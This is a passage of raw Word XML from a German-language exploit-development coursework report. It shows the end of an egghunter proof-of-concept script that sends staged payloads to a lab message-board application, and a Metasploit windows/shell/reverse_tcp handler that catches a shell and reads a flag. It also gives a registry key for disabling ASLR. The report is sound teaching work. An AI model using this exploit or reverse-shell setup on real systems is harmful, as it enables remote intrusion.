                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>connect=s.connect(('10.0.2.15', 4444)) # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="581773AE" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16BDACDC" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(bytes('A \r\n', 'utf-8')) # Adding new message</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="059D34D0" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AFFCE93" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(stage2 + bytes('\r\n', 'utf-8')) # Message Name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42A4D463" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4874C4E3" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(stage2 + bytes('\r\n', 'utf-8')) # Message Body</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42B21A06" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="459D1EB0" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="37AF1CDB" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(bytes('C \r\n', 'utf-8')) # Chaning board topic</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53F2CC02" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24894963" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(stage1 + bytes('\r\n', 'utf-8')) # Topic name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41D11A94" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DF581C6" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(bytes('y\r\n', 'utf-8')) # Conformation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CB3E789" w14:textId="1E8052E3" w:rsidR="00606B6C" w:rsidRPr="00B47CB9" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>s.close()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00866A18" w:rsidRPr="00804E4D" w14:paraId="6B6AAB91" w14:textId="77777777" w:rsidTr="00606B6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4EBE08F6" w14:textId="05306902" w:rsidR="00866A18" w:rsidRPr="000700A3" w:rsidRDefault="00804E4D" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00804E4D">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>poc_board_release_egghunter.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E41CA5D" w14:textId="6AC93DED" w:rsidR="00606B6C" w:rsidRPr="00804E4D" w:rsidRDefault="00606B6C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="455993C0" w14:textId="30E7E407" w:rsidR="002A6A44" w:rsidRPr="00B47CB9" w:rsidRDefault="00752C62" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Bevor das Skript gestartet wurde, wurde mithilfe von Metasploit ein Handler eingerichtet. </w:t>
      </w:r>
      <w:r w:rsidR="001873D1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Dieser wurde mit dem</w:t>
      </w:r>
      <w:r w:rsidR="00656A4C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> richt</w:t>
      </w:r>
      <w:r w:rsidR="00A43AE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>igen</w:t>
      </w:r>
      <w:r w:rsidR="001873D1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Payload</w:t>
      </w:r>
      <w:r w:rsidR="00A43AE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (windows/shell/reverse_tcp)</w:t>
      </w:r>
      <w:r w:rsidR="001873D1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00742C25" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Listener Host</w:t>
      </w:r>
      <w:r w:rsidR="00A43AE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (10.0.2.11)</w:t>
      </w:r>
      <w:r w:rsidR="00742C25" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> und Port </w:t>
      </w:r>
      <w:r w:rsidR="00A43AE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">(5555) </w:t>
      </w:r>
      <w:r w:rsidR="00742C25" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>konfiguriert und gestartet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F862EE6" w14:textId="19C204B3" w:rsidR="00A43AE0" w:rsidRPr="00B47CB9" w:rsidRDefault="00A43AE0" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="433B0405" w14:textId="25E414BC" w:rsidR="00A43AE0" w:rsidRPr="00B47CB9" w:rsidRDefault="00A43AE0" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="456E27E1" wp14:editId="6DEC862B">
            <wp:extent cx="5759450" cy="2713355"/>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59450" cy="2713355"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FC468A" w14:textId="45F7F501" w:rsidR="00A43AE0" w:rsidRPr="00B47CB9" w:rsidRDefault="00C556A5" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="547F0FD0" wp14:editId="298E8058">
            <wp:extent cx="4010025" cy="609600"/>
            <wp:effectExtent l="0" t="0" r="9525" b="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010025" cy="609600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FBBFE7" w14:textId="6284431A" w:rsidR="00A43AE0" w:rsidRPr="00B47CB9" w:rsidRDefault="00A43AE0" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C56A49F" w14:textId="270F9C07" w:rsidR="00613706" w:rsidRPr="00B47CB9" w:rsidRDefault="00C556A5" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend wurde die Board Release Anwendung auf der Windows Maschine gestartet und </w:t>
      </w:r>
      <w:r w:rsidR="004770B4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">das Python Skript auf der Kali Maschine ausgeführt. </w:t>
      </w:r>
      <w:r w:rsidR="00875828" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Handler konnte die </w:t>
      </w:r>
      <w:r w:rsidR="00613706" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Verbindung entgegennehmen. Der Inhalt der platzierten Flag konnte erfolgreich ausgelesen werden:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE18ECA" w14:textId="142F917C" w:rsidR="00613706" w:rsidRPr="00B47CB9" w:rsidRDefault="00613706" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FECFB10" w14:textId="3A6E40F9" w:rsidR="00CE2444" w:rsidRPr="00B47CB9" w:rsidRDefault="00613706" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B64E249" wp14:editId="04BFF993">
            <wp:extent cx="5759450" cy="3581400"/>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59450" cy="3581400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BF650D" w14:textId="77777777" w:rsidR="00CE2444" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE2444">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2485C1F3" w14:textId="42172373" w:rsidR="00613706" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE2444" w:rsidP="0044082C">
      <w:pPr>
        <w:pStyle w:val="berschrift1"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc62994617"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Abgabe 3</w:t>
      </w:r>
      <w:r w:rsidR="004C20B9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (6P)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="34E4ED8E" w14:textId="021B2616" w:rsidR="00A47CC2" w:rsidRPr="00B47CB9" w:rsidRDefault="004C20B9" w:rsidP="004D017F">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc62994618"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Angabe</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="76A96A9C" w14:textId="188A1123" w:rsidR="00A47CC2" w:rsidRPr="00B47CB9" w:rsidRDefault="001E7754" w:rsidP="00A47CC2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>Na,</w:t>
      </w:r>
      <w:r w:rsidR="00A47CC2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> so schwer war das wirklich nicht und für Sie natürlich keine Herausforderung. Da man aber bekanntlich nur an diesen wächst, fordern Sie sich gleich selbst heraus! </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286C86D8" w14:textId="5C6BCE1E" w:rsidR="00A47CC2" w:rsidRPr="00B47CB9" w:rsidRDefault="00A47CC2" w:rsidP="00A47CC2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>Sie definieren sich selbst folgende Spielregel, Sie versuchen die Anwendung diesmal ohne Egghunter allerdings mit eingeschaltetem DEP und ALSR zu exploiten. Schaffen Sie das bekommen Sie die volle Punkte Anzahl, schaffen Sie den Exploit nur mit aktiviertem DEP immerhin noch die halbe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F5723A" w14:textId="45EF1D02" w:rsidR="000B149C" w:rsidRPr="00B47CB9" w:rsidRDefault="000B149C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0138B5B7" w14:textId="11923CE6" w:rsidR="00A47CC2" w:rsidRPr="00B47CB9" w:rsidRDefault="000B149C" w:rsidP="000B149C">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc62994619"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Lösung</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="1E841099" w14:textId="32370D5C" w:rsidR="00A47CC2" w:rsidRPr="00B47CB9" w:rsidRDefault="00A47CC2" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0508590B" w14:textId="771CF6CA" w:rsidR="000B149C" w:rsidRPr="00B47CB9" w:rsidRDefault="000B149C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Für die</w:t>
      </w:r>
      <w:r w:rsidR="00566D73" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Umsetzung der</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Aufgabenstellung wurde ein</w:t>
      </w:r>
      <w:r w:rsidR="00566D73" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Windows 7 32 Bit Betriebssystem mit aktivierten DEP und ALSR verwendet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F1EB01" w14:textId="77777777" w:rsidR="005C572C" w:rsidRPr="00B47CB9" w:rsidRDefault="005C572C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2357A776" w14:textId="1AB685A3" w:rsidR="00607FD2" w:rsidRPr="00B47CB9" w:rsidRDefault="00280ECA" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>DEP wurde wie folgt aktiviert</w:t>
      </w:r>
      <w:r w:rsidR="00B87369">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9BECB2" w14:textId="24F39CE3" w:rsidR="0088734B" w:rsidRPr="00B47CB9" w:rsidRDefault="0088734B" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C89C617" wp14:editId="4C816AD3">
            <wp:extent cx="3819525" cy="533400"/>
            <wp:effectExtent l="0" t="0" r="952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19525" cy="533400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D68788" w14:textId="23DF656A" w:rsidR="00770778" w:rsidRPr="00B47CB9" w:rsidRDefault="00770778" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04D80BA7" w14:textId="47FB7629" w:rsidR="00EC3E80" w:rsidRPr="00B47CB9" w:rsidRDefault="00EC3E80" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Laut einem Artikel von Vraz Azarav deaktiviert man ASRL in Windows mit folgendem Reg Key </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#8035307d-c88b-44a2-892b-95b3ea91382d"/>
          <w:id w:val="-1536732580"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[7]</w:t>
          </w:r>
          <w:r w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00A378C9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF32071" w14:textId="4F8E5B6A" w:rsidR="00A378C9" w:rsidRPr="00B47CB9" w:rsidRDefault="00A378C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2355BEFC" w14:textId="6298CF53" w:rsidR="00A378C9" w:rsidRPr="00866A18" w:rsidRDefault="00A378C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00866A18">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5698DE" w14:textId="64333DD6" w:rsidR="00A378C9" w:rsidRPr="00866A18" w:rsidRDefault="00A378C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CD815A2" w14:textId="2D14090A" w:rsidR="00A378C9" w:rsidRPr="00B47CB9" w:rsidRDefault="00A378C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>“MoveImages”=dword:00000000 (without quote)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AB7E53" w14:textId="721A311B" w:rsidR="00A378C9" w:rsidRPr="00B47CB9" w:rsidRDefault="00A378C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4606652D" w14:textId="3B142BA2" w:rsidR="00EC3E80" w:rsidRPr="00B47CB9" w:rsidRDefault="00A378C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Um aufzeigen zu können, dass dies nicht gemacht wurde, wurde der folgende Screenshot erstellt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA179BA" w14:textId="5C44133F" w:rsidR="00770778" w:rsidRPr="00B47CB9" w:rsidRDefault="00770778" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="79AC2425" wp14:editId="34F5DB9D">
            <wp:extent cx="5759450" cy="3735705"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>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59450" cy="3735705"/>
                    </a:xfrm>
